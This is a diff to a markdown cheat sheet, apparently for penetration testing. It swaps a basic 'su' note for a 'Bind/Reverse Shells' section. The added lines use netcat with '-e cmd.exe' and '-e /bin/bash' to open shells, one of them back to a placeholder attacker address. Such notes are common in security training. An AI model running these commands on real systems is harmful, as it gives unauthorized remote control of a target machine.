@@ -1,9 +1,19 @@
-## Linux Bash Commands
-
+### Bind/Reverse Shells
+#### Bind Shell (don't work behind firewalls)
 ```
-# Change user
-su username
+# On Windows machine offer shell
+nc -lvp 4444 -e cmd.exe
 
+# On Kali machine connect
+nc -nv win.dow.si.p 4444
+```
+#### Reverse Shell
+```
+# On Kali Machine listen for connection
+nc -lvp 4444
+
+# On target machine
+nc -nv att.ac.kin.gip 4444 -e /bin/bash
 ```
 ### Improving your Shell
 ```
